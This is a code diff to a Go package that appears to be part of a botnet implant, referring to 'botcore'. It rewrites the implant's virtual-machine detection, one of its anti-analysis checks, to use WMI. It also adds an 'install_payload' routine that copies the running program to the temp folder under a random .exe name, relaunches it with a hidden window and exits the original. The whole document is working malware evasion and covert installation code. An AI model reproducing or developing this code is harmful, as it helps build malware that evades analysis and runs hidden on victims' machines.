@@ -1,11 +1,16 @@
 package components
 
 import (
+	"log"
 	"os"
 	"os/exec"
 	"os/user"
+	"path"
 	"runtime"
 	"strings"
+	"syscall"
+
+	"github.com/StackExchange/wmi"
 )
 
 func is_debugger_exist() bool {
@@ -77,12 +82,10 @@ func in_sandbox_now() bool {
 
 func in_vm_now() bool {
 	if runtime.GOOS == "windows" {
-		cmd := exec.Command("powershell", "-Command", "Get-CimInstance Win32_ComputerSystem | Select-Object Manufacturer, Model")
-		out, err := cmd.Output()
-		if err != nil {
-			return false
-		}
-		lower := strings.ToLower(string(out))
+		var dst []Win32_ComputerSystem
+		query := "SELECT Manufacturer, Model FROM Win32_ComputerSystem"
+		wmi.Query(query, &dst)
+		lower := strings.ToLower(dst[0].Manufacturer)
 		vmSigns := []string{"vmware", "virtualbox", "kvm", "xen", "qemu", "hyper-v"}
 		for _, s := range vmSigns {
 			if strings.Contains(lower, s) {
@@ -107,5 +110,36 @@ func in_vm_now() bool {
 }
 
 func install_payload() {
+	if runtime.GOOS == "windows" {
+		if len(botcore.install_file) == 0 {
+			botcore.install_file = random_string(8)
+			if runtime.GOOS == "windows" {
+				botcore.install_file += ".exe"
+			}
+		}
+		temp_path := os.TempDir()
+		install_path := path.Join(temp_path, botcore.install_file)
+		origin_path := get_module_file()
+		// Already in the installed path
+		if strings.Contains(origin_path, temp_path) {
+			return
+		}
 
+		if err := copy_file(origin_path, install_path); err != nil {
+			log.Println("Failed to copy file to " + install_path)
+			return
+		}
+		pfnCloseHandle.Call(botcore.sington_mutex)
+
+		cmd := exec.Command(install_path, "-c", origin_path)
+		cmd.SysProcAttr = &syscall.SysProcAttr{
+			HideWindow: true,
+		}
+		if err := cmd.Start(); err != nil {
+			return
+		}
+		os.Exit(0)
+	} else {
+		// linux
+	}
 }
